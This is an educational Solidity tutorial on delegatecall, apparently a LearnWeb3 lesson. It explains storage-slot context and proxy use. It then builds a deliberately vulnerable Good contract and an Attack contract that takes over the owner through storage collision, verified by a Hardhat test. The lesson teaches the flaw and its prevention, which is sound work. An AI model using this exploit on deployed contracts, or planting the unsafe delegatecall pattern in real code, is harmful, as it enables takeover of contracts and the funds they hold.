# 🐙 Running code from other contracts inside your own through `.delegatecall(...)`

![](https://i.imgur.com/78ty5XV.png)

`.delegatecall()` is a method in Solidity used to call a function in a target contract from an original contract. However, unlike other methods, when the function is executed in the target contract using `.delegatecall()`, the context is passed from the original contract i.e. the code executes in the target contract, but variables get modified in the original contract.

Through this tutorial, we will learn why its important to correctly understand how `.delegatecall()` works or else it can have some severe consequences.

---

## 😕 Wait, what?

Let's start by understanding how this works.

The important thing to note when using `.delegatecall()` is that the context the original contract is passed to the target, and all state changes in the target contract reflect on the original contract's state and not on the target contract's state even though the function is being executed on the target contract.

<Quiz questionId="f0a4b9c6-e18f-436c-a417-20ac744162ca" />

Let's try understanding with the help of an example.

In Ethereum, a function can be represented as `4 + 32*N` bytes where `4 bytes` are for the function selector and the `32*N` bytes are for function arguments.

- **Function Selector:** To get the function selector, we hash the function's name along with the type of its arguments without the empty space eg. for something like `putValue(uint value)`, you will hash `putValue(uint)` using `keccak-256` which is a hashing function used by Ethereum and then take its first 4 bytes. To understand keccak-256 and hashing better, I suggest you watch this [video](https://www.youtube.com/watch?v=rxZR3ITZlzE)
- **Function Argument:** Convert each argument into a hex string with a fixed length of 32 bytes and concatenate them.

<Quiz questionId="8714cc52-9d26-47fb-aff0-355ea7a2d50e" />
<Quiz questionId="b350a0d5-562c-43e9-88b9-f114bb4600c8" />
<Quiz questionId="87906629-bd28-4947-b523-bec77b8f2a2a" />

We have two contracts `Student.sol` and `Calculator.sol`. We don't know the ABI of `Calculator.sol` but we know that their exists an `add` function which takes in two `uint`'s and adds them up within the `Calculator.sol`

Let's see how we can use `delegateCall` to call this function from `Student.sol`

```solidity
pragma solidity ^0.8.4;

contract Student {

    uint public mySum;
    address public studentAddress;

    function addTwoNumbers(address calculator, uint a, uint b) public returns (uint)  {
        (bool success, bytes memory result) = calculator.delegatecall(abi.encodeWithSignature("add(uint256,uint256)", a, b));
        require(success, "The call to calculator contract failed");
        return abi.decode(result, (uint));
    }
}
```

```solidity
pragma solidity ^0.8.4;

contract Calculator {
    uint public result;
    address public user;

    function add(uint a, uint b) public returns (uint) {
        result = a + b;
        user = msg.sender;
        return result;
    }
}
```

Our `Student` contract here has a function `addTwoNumbers` which takes an address, and two numbers to add together. Instead of executing it directly, it tries to do a `.delegatecall()` on the address for a function `add` which takes two numbers.

We used `abi.encodeWithSignature`, also the same as `abi.encodeWithSelector`, which first hashes and then takes the first 4 bytes out of the function's name and type of arguments. In our case it did the following: `(bytes4(keccak256(add(uint,uint))` and then appends the parameters - `a`, `b` to the 4 bytes of the function selector. These are 32 bytes long each (32 bytes = 256 bits, which is what `uint256` can store).

All this when concatenated is passed into the `delegatecall` method which is called upon the address of the calculator contract.

The actual addition part is not that interesting, what's interesting is that the `Calculator` contract actually sets some state variables. But remember when the values are getting assigned in `Calculator` contract, they are actually getting assigned to the storage of the `Student` contract because deletgatecall uses the storage of the original contract when executing the function in the target contract. So what exactly will happen is as follows:

![](https://i.imgur.com/oVhXQas.png)

<Quiz questionId="bd4b53a7-05a7-4290-b34e-291815a9ddb7" />

You know from the previous lessons that each variable slot in solidity is of 32 bytes which is 256 bits. And when we used `.delegatecall()` from `Student` to `Calculator` we used the storage of `Student` and not of `Calculator` but the problem is that even though we are using the storage of `Student`, the slot numbers are based on the calculator contract and in this case when you assign a value to `result` in the `add` function of `Calculator.sol`, you are actually assigning the value to `mySum` which in the student contract.

This can be problematic, because storage slots can have variables of different data types. What if the `Student` contract instead had values defined in this order?

```solidity

contract Student {
    address public studentAddress;
    uint public mySum;
}
```

In this case, the `address` variable would actually end up becoming the value of `result`. You may be thinking how can an `address` data type contain the value of a `uint`? To answer that, you have to think a little lower-level. At the end of the day, all data types are just bytes. `address` and `uint` are both 32 byte data types, and so the `uint` value for `result` can be set in the `address public studentAddress` variable as they're both still 32 bytes of data.

## Actual Use Cases

`.delegatecall()` is heavily used within proxy (upgradeable) contracts. Since smart contracts are not upgradeable by default, the way to make them upgradeable is typically by having one storage contract which does not change, which contains an address for an implementation contract. If you wanted to update your contract code, you change the address of the implementation contract to something new. The storage contract makes all calls using `.delegatecall()` which allows to run different versions of the code while maintaining the same persisted storage over time, no matter how many implementation contracts you change. Therefore, the logic can change, but the data is never fragmented.

<Quiz questionId="2bb0f6c2-c8fb-4d5b-9b2d-12ee3827ac90" />

## Attack using delegatecall

But, since `.delegatecall()` modifies the storage of the contract calling the function, there are some nasty attacks that can be designed if `.delegatecall()` is not properly implemented. We will now simulate an attack using `.delegatecall()`.

## ⚒️ Build

### Overview

- We will have three smart contracts `Attack.sol`, `Good.sol` and `Helper.sol`
- Hacker will be able to use `Attack.sol` to change the owner of `Good.sol` using `.delegatecall()`

### Setup

Let's build an example where you can experience how the attack happens. Start by creating a new project directory.

```bash
mkdir delegate-call
```

Let's now setup Hardhat inside the `delegate-call` directory.

```bash
cd delegate-call
npm init --yes
npm install --save-dev hardhat @nomicfoundation/hardhat-toolbox
npx hardhat
```

when prompted, choose the `Create a Javascript Project` option and follow the steps.

### Writing the Smart Contracts

Let's start off by creating an innocent looking contract - `Good.sol`. It will contain the address of the `Helper` contract, and a variable called `owner`. The function `setNum` will do a `delegatecall()` to the `Helper` contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Good {
    address public helper;
    address public owner;
    uint public num;

    constructor(address _helper) {
        helper = _helper;
        owner = msg.sender;
    }

    function setNum( uint _num) public {
        helper.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
    }
}
```

After creating `Good.sol`, we will create the `Helper` contract inside the `contracts` directory named `Helper.sol`. This is a simple contract which updates the value of `num` through the `setNum` function. Since it only has one variable, the variable will always point to `Slot 0`. When used with `delegatecall`, it will modify the value at `Slot 0` of the original contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Helper {
    uint public num;

    function setNum(uint _num) public {
        num = _num;
    }
}
```

Now create a contract named `Attack.sol` within the `contracts` directory and write the following lines of code. We will understand how it works step by step.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Good.sol";

contract Attack {
    address public helper;
    address public owner;
    uint256 public num;

    Good public good;

    constructor(Good _good) {
        good = Good(_good);
    }

    function setNum(uint256 _num) public {
        owner = msg.sender;
    }

    function attack() public {
        // This is the way you typecast an address to a uint
        good.setNum(uint256(uint160(address(this))));
        good.setNum(1);
    }
}
```

The attacker will first deploy the `Attack.sol` contract and will take the address of a `Good` contract in the constructor. He will then call the `attack` function which will further initially call the setNum function present inside `Good.sol`

Interesting point to note is the argument with which the setNum is initially called, its an address typecasted into a uint256, which is it's own address. After `setNum` function within the `Good.sol` contract receives the address as a uint, it further does a `delegatecall` to the `Helper` contract because right now the `helper` variable is set to the address of the `Helper` contract.

Within the `Helper` contract when the setNum is executed, it sets the `_num` which in our case right now is the address of `Attack.sol` typecasted into a uint into num. Note that because `num` is located at `Slot 0` of `Helper` contract, it will actually assign the address of `Attack.sol` to `Slot 0` of `Good.sol`. Woops... You may see where this is going. `Slot 0` of `Good` is the `helper` variable, which means, the attacker has successfully been able to update the `helper` address variable to it's own contract now.

Now the address of the `helper` contract has been overwritten by the address of `Attack.sol`. The next thing that gets executed in the `attack` function within `Attack.sol` is another setNum but with number 1. The number 1 plays no relevance here, and could've been set to anything.

Now when setNum gets called within `Good.sol` it will delegate the call to `Attack.sol` because the address of `helper` contract has been overwritten.

The `setNum` within `Attack.sol` gets executed which sets the `owner` to `msg.sender` which in this case is `Attack.sol` itself because it was the original caller of the `delegatecall` and because owner is at `Slot 1` of `Attack.sol`, the `Slot 1` of `Good.sol` will be overwritten which is its `owner`.

Boom the attacker was able to change the `owner` of `Good.sol` 👀 🔥

### Writing the Test

Let's try actually executing this attack using code. We will utilize Hardhat Tests to demonstrate the functionality.

Inside the `test` folder create a new file named `attack.js` and add the following lines of code

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("delegatecall Attack", function () {
  it("Should change the owner of the Good contract", async function () {
    // Deploy the helper contract
    const Helper = await ethers.getContractFactory("Helper");
    const helperContract = await Helper.deploy();
    await helperContract.deployed();
    console.log("Helper Contract's Address:", helperContract.address);

    // Deploy the good contract
    const Good = await ethers.getContractFactory("Good");
    const goodContract = await Good.deploy(helperContract.address);
    await goodContract.deployed();
    console.log("Good Contract's Address:", goodContract.address);

    // Deploy the Attack contract
    const Attack = await ethers.getContractFactory("Attack");
    const attackContract = await Attack.deploy(goodContract.address);
    await attackContract.deployed();
    console.log("Attack Contract's Address", attackContract.address);

    // Now let's attack the good contract

    // Start the attack
    let tx = await attackContract.attack();
    await tx.wait();

    expect(await goodContract.owner()).to.equal(attackContract.address);
  });
});
```

To execute the test to verify that the `owner` of `Good` contract was indeed changes, in your terminal pointing to the directory which contains all your code for this level execute the following command

```bash
npx hardhat test
```

If your tests are passing the owner address of good contract was indeed changed, since we equate the value of the `owner` variable in `Good` to the address of the `Attack` contract at the end of the test.

# 👮 Prevention

Use stateless library contracts which means that the contracts to which you delegate the call should only be used for execution of logic and should not maintain state. This way, it is not possible for functions in the library to modify the state of the calling contract.

<Quiz questionId="d4c2dc50-77ab-4b54-a4ab-11983a835ee6" />

# References

- [Delegate call](https://medium.com/coinmonks/delegatecall-calling-another-contract-function-in-solidity-b579f804178c)
- [Solidity by Example](https://solidity-by-example.org/)

<Quiz questionId="1ad4680d-8410-41e9-998f-278e24250fa4" />
<Quiz questionId="a57dfe3d-ff0e-4b1d-8374-55eabd258e49" />

## 👋 Conclusion

Hope you learnt something from this level. If you have any questions or feel stuck or just want to say Hi, hit us up on our [Discord](https://discord.gg/learnweb3). We look forward to seeing you there!

<SubmitQuiz />
